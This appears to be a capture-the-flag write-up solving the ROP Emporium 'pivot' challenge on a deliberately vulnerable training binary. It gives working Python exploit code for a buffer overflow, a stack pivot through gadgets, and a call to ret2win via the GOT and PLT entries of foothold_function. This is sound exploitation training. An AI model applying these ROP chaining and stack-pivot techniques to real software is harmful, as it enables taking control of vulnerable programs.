# pivot - 64 bit
as the name implies, we will need to pivot our stack to a different location.  
    
running the binary we get:    
![inital](https://user-images.githubusercontent.com/60041914/78302149-e9431380-7542-11ea-9fc0-aa2dde2ebd07.png)
    
reading the instructions at https://ropemporium.com/index.html we get a clearer image:     
     
"To stack pivot just means to move the stack pointer elsewhere. It's a useful ROP technique and applies in cases where your initial chain is limited in size (as it is here)"    
...      
"In this challenge you'll also need to apply what you've previously learned about the .plt and .got.plt sections of ELF binaries. If you haven't already read appendix A in the beginner's guide, this would be a good time. This challenge imports a function called foothold_function() from a library that also contains a nice ret2win function."    
...    
"You'll need to find the .got.plt entry of foothold_function() and add the offset of ret2win() to it to resolve its actual address."    
    
cool. now it's clear: the address given to us is where our stack should end up.     
we first control the 2nd stage (after pivot,call ret2win)     
and then we get to do the stack smashing(pivot to given location)   
    
 ## first stage
 the first stage we can do preety easily.    
 first, get the address from the binary using some regular expressions.    
 ```python
r=process("./pivot")
output=r.recvuntil(b"Send your")
pivot_addr=re.findall('pivot.{16}',output.decode())[1][7:] # ugly re code
pivot_addr=int(pivot_addr,16)
 ```
 then smash the return pointer and use these gadgets:     
 ```
 0x0000000000400b00 : pop rax ; ret
 0x0000000000400b02 : xchg rax, rsp ; ret
 ```
 to pivot.(setting rax to address and doing an xchg rax, rsp)     
      
 translates to this python code:     
 ```python
SET_RAX=0x00400b00
PIVOT=0x00400b02
stage1=b'A'*40
stage1+=p64(SET_RAX) # set rax to the desired pivot addr(from the binary output)
stage1+=p64(pivot_addr)
stage1+=p64(PIVOT) # xchg rax,rsp
 ```
 ## second stage
 the second stage requires a bit more thinking.    
      
 from the way dynamic binding works we know that the first call to a function populates the GOT.    
 so before calculating our offset we need to call footholdfunction() from the PLT.  
       
 after doing this, we can grab its address from the GOT. 
       
 then, we should add the offset from it to our ret2win function.   
 all in all, it would require these gadgets:     
 ```
0x0000000000400900 : pop rbp ; ret
0x0000000000400b09 : add rax, rbp ; ret
0x000000000040098e : call rax
0x0000000000400b00 : pop rax ; ret
 ```
 using objdump we can calculate the offset:     
 ![offsets](https://user-images.githubusercontent.com/60041914/78302543-a9c8f700-7543-11ea-98e7-b6505c17b866.png)
      
 and turn it into this python code:   
 ```python
CALL_RAX=0x0040098e
SET_RAX=0x00400b00
SET_RBP=0x00400900
ADD_RAX_RBP=0x00400b09
READ_AT_RAX=0x00400b05
GOT_FOOTHOLD=0x00602048
PLT_FOOTHOLD=0x00400850

stage2=p64(PLT_FOOTHOLD) # call foothold function to populate the GOT
stage2+=p64(SET_RAX)
stage2+=p64(GOT_FOOTHOLD)
stage2+=p64(READ_AT_RAX)#get addr of foothold function to rax
stage2+=p64(SET_RBP)
stage2+=p64(0x14e) # add ret2win offset
stage2+=p64(ADD_RAX_RBP)
stage2+=p64(CALL_RAX) # call ret2win
 ```
 running the script...     
 ![done](https://user-images.githubusercontent.com/60041914/78302547-ab92ba80-7543-11ea-9f6d-f234c7587246.png)
      
nice! it works!     
